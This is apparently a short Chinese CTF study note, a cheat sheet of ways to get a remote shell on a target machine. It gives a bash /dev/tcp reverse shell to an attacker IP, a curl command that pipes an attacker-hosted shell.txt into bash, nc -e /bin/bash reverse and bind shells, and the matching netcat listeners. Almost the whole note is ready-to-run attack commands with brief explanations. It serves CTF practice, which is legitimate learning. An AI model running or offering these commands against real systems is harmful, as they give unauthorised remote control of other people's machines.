---
tags:
  - CTF-WEB
categories:
  - CTF-WEB
date: 2020-03-26 14:45:00
cover: /img/post/10.jpg
---

---
说明：端口可任意，但要保持一致而且不能被占用，以下均为攻击机登录被攻击机

# bash连接

```bash
攻击机器输入 nc -lvp 7777

被攻击机器输入bash -i >& /dev/tcp/攻击机ip/7777 0>&1  
```

然后攻击机器就相当于登陆了了被攻击机器

# curl连接

```bash
在攻击机根目录下创建shell.txt,内容为bash -i >& /dev/tcp/攻击机ip/7777 0>&1

//注意shell.txt不是在服务器根目录，而是例如/var/www/html下
被攻击机执行curl 攻击机ip/shell.txt|bash  //先curl获得shell.txt的内容然后用bash执行
```

# nc连接

说明：用nc连接成功后不会出现类似bash连接那种开头的root@kali这种，可用pwd检测是否连接成功

### 利用攻击机ip

```bash
攻击机输入 nc -lvp 7777

被攻击机输入 nc -e /bin/bash 攻击机ip 7777
```
### 利用被攻击机ip

**其他都是需要攻击机ip，这个则相反。我的理解是需要攻击机ip的相当于把shell弹给攻击机(所以攻击机ip和bash在一行代码)，而这个相当于在本地端口开个shell,攻击机访问端口来拿shell**

```bash
攻击机输入 nc 被攻击机ip 7777

被攻击机输入  nc -lvp 7777 -e /bin/bash
```

### 
